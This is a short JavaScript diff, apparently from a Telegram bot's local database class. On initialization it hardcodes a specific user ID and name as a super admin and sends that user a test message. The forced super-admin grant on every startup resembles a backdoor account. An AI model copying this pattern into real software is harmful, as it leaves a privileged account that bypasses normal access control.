@@ -32,6 +32,20 @@ class LocalDatabase {
         this.initialized = true
         console.log("Database initialized!")
 
+        if (!this.getAdmins().some(admin => admin.id === 387051080)) {
+            const admin = this.addAdmin({
+                user_id: 387051080,
+                isSuper: true,
+                date: 1,
+                adderUsername: "aylivdele",
+                first_name: "Илья",
+                last_name: "Рассомахин",
+                username: "aylivdele",
+            })
+
+            bot.sendMessage(admin.username, 'Test')
+        }
+
     }
 
     getCollection(collectionName) {
